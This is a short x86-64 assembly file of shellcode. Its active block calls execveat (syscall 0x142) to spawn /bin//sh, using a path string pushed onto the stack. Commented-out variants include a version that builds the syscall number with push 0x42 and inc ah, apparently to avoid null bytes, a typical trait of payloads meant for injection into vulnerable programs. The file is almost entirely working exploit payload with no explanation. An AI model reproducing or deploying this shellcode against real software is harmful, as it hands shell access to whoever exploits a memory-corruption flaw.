global _start

section .text

_start:

    ;mov rax, 0x143
    ;mov rdi, 0x68732f2f6e69622f
    ;push rdi
    ;push rsp
    ;pop rsi
    ;syscall

    mov rax, 0x142
    push rdx
    mov rdi, 0x68732f2f6e69622f
    push rdi
    push rsp
    pop rsi
    syscall
    

    ;push 0x42
    ;pop rax
    ;inc ah
    ;cqo
    ;push rdx
    ;mov rdi, 0x68732f2f6e69622f
    ;push rdi
    ;push rsp
    ;pop    rsi
    ;mov    r8, rdx
    ;mov    r10, rdx
    ;syscall
